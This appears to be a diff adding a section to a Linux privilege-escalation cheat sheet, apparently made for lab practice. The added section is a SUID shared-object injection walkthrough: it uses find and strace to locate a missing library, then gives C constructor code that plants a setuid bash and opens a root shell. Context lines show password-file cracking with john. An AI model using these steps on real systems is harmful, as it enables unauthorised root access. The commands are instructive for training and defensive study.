@@ -76,5 +76,43 @@ unshadow passwd.txt shadow.txt > passwords.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
 ```
 
+## 📌SUID (Shared Object Injection)
+```
+# => Enumeration:
+# ---------------
+find / -type f -perm -04000 -ls 2>/dev/null					# → Searches for all SUID binaries (binaries running with owner's privileges).
+# From the output, make note of all the SUID binaries.
+strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"	# → Uses strace to find missing/shared object files that the SUID binary tries to access.
+# From the output, notice that a .so file is missing from a writable directory like this:
+# open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
+
+# -------------------------------------------------------------------------------------------------------------------------------------
+
+# => Exploitation:
+# ---------------
+mkdir /home/user/.config	# → Creates the missing writable directory the SUID binary is trying to access.
+cd /home/user/.config		# → Navigates into the target directory.
+vim libcalc.c			# → Opens a C source file for writing the malicious shared object code.
+
+# ------------------------------------------------------------------
+# Code:
+# -----
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+
+# ------------------------------------------------------------------
+
+gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c		# → Compiles the malicious shared object (.so) file that gets executed automatically.
+/usr/local/bin/suid-so		# → Runs the vulnerable SUID binary which loads and executes libcalc.so with root privileges.
+id && whoami			# → Confirms root shell by displaying user ID and username.
+```
+
 # 🔎Other Techniques
 You can use this article to see other techniques:👉 [https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/]
